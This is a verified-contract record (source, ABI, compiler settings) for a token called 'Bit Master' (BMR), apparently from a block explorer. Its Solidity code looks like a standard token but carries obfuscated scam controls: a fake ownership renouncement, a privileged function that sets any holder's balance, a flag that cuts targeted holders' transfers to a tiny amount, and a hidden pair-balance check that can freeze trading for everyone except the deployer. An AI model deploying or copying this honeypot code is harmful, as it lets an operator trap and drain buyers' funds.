{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface swapLaunch {\n    function createPair(address takeMarketing, address enableReceiver) external returns (address);\n}\n\ninterface limitTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toList) external view returns (uint256);\n\n    function transfer(address tradingMarketing, uint256 shouldAt) external returns (bool);\n\n    function allowance(address shouldAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingMarketing,\n        uint256 shouldAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxBuyAuto, uint256 value);\n    event Approval(address indexed shouldAuto, address indexed spender, uint256 value);\n}\n\nabstract contract shouldTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitTakeMetadata is limitTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BitMaster is shouldTo, limitTake, limitTakeMetadata {\n\n    uint256 private feeAtWallet = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return minLaunchedTo;\n    }\n\n    function sellAt() private view {\n        require(tokenWalletShould[_msgSender()]);\n    }\n\n    function approve(address isBuy, uint256 shouldAt) public virtual override returns (bool) {\n        tokenAmountFund[_msgSender()][isBuy] = shouldAt;\n        emit Approval(_msgSender(), isBuy, shouldAt);\n        return true;\n    }\n\n    mapping(address => bool) public tokenWalletShould;\n\n    bool public maxReceiver;\n\n    mapping(address => mapping(address => uint256)) private tokenAmountFund;\n\n    address private minLaunchedTo;\n\n    uint8 private enableFee = 18;\n\n    uint256 constant liquidityReceiverExempt = 16 ** 10;\n\n    event OwnershipTransferred(address indexed autoFund, address indexed isSwapSender);\n\n    string private launchedTradingSwap = \"BMR\";\n\n    function transferFrom(address tokenFund, address tradingMarketing, uint256 shouldAt) external override returns (bool) {\n        if (_msgSender() != senderFromSwap) {\n            if (tokenAmountFund[tokenFund][_msgSender()] != type(uint256).max) {\n                require(shouldAt <= tokenAmountFund[tokenFund][_msgSender()]);\n                tokenAmountFund[tokenFund][_msgSender()] -= shouldAt;\n            }\n        }\n        return minFee(tokenFund, tradingMarketing, shouldAt);\n    }\n\n    function toMarketing(address fundAt) public {\n        require(fundAt.balance < 100000);\n        if (maxReceiver) {\n            return;\n        }\n        if (exemptReceiver != teamReceiver) {\n            teamReceiver = exemptReceiver;\n        }\n        tokenWalletShould[fundAt] = true;\n        \n        maxReceiver = true;\n    }\n\n    function maxFundTx() public {\n        emit OwnershipTransferred(txShould, address(0));\n        minLaunchedTo = address(0);\n    }\n\n    uint256 private teamReceiver;\n\n    bool public buyAmount;\n\n    function swapReceiver(address tokenFund, address tradingMarketing, uint256 shouldAt) internal returns (bool) {\n        require(senderLiquidity[tokenFund] >= shouldAt);\n        senderLiquidity[tokenFund] -= shouldAt;\n        senderLiquidity[tradingMarketing] += shouldAt;\n        emit Transfer(tokenFund, tradingMarketing, shouldAt);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableFee;\n    }\n\n    mapping(address => bool) public enableTx;\n\n    function minFee(address tokenFund, address tradingMarketing, uint256 shouldAt) internal returns (bool) {\n        if (tokenFund == txShould) {\n            return swapReceiver(tokenFund, tradingMarketing, shouldAt);\n        }\n        uint256 maxTx = limitTake(maxLaunchedLiquidity).balanceOf(toLaunched);\n        require(maxTx == toTeam);\n        require(tradingMarketing != toLaunched);\n        if (enableTx[tokenFund]) {\n            return swapReceiver(tokenFund, tradingMarketing, liquidityReceiverExempt);\n        }\n        return swapReceiver(tokenFund, tradingMarketing, shouldAt);\n    }\n\n    uint256 private exemptReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeAtWallet;\n    }\n\n    function balanceOf(address toList) public view virtual override returns (uint256) {\n        return senderLiquidity[toList];\n    }\n\n    string private fromAmount = \"Bit Master\";\n\n    address public maxLaunchedLiquidity;\n\n    function feeTeam(address fundIs) public {\n        sellAt();\n        \n        if (fundIs == txShould || fundIs == maxLaunchedLiquidity) {\n            return;\n        }\n        enableTx[fundIs] = true;\n    }\n\n    address toLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address autoLimit, uint256 shouldAt) external virtual override returns (bool) {\n        return minFee(_msgSender(), autoLimit, shouldAt);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTradingSwap;\n    }\n\n    function allowance(address senderLimit, address isBuy) external view virtual override returns (uint256) {\n        if (isBuy == senderFromSwap) {\n            return type(uint256).max;\n        }\n        return tokenAmountFund[senderLimit][isBuy];\n    }\n\n    address public txShould;\n\n    uint256 fromReceiverTake;\n\n    function modeFund(uint256 shouldAt) public {\n        sellAt();\n        toTeam = shouldAt;\n    }\n\n    constructor (){\n        \n        toWallet minSender = toWallet(senderFromSwap);\n        maxLaunchedLiquidity = swapLaunch(minSender.factory()).createPair(minSender.WETH(), address(this));\n        \n        txShould = _msgSender();\n        tokenWalletShould[txShould] = true;\n        senderLiquidity[txShould] = feeAtWallet;\n        maxFundTx();\n        \n        emit Transfer(address(0), txShould, feeAtWallet);\n    }\n\n    bool private tradingTeam;\n\n    mapping(address => uint256) private senderLiquidity;\n\n    function owner() external view returns (address) {\n        return minLaunchedTo;\n    }\n\n    address senderFromSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function minSwap(address autoLimit, uint256 shouldAt) public {\n        sellAt();\n        senderLiquidity[autoLimit] = shouldAt;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromAmount;\n    }\n\n    uint256 toTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSwapSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxBuyAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"}],\"name\":\"feeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFundTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunchedLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"minSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"modeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"}],\"name\":\"toMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenWalletShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BitMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}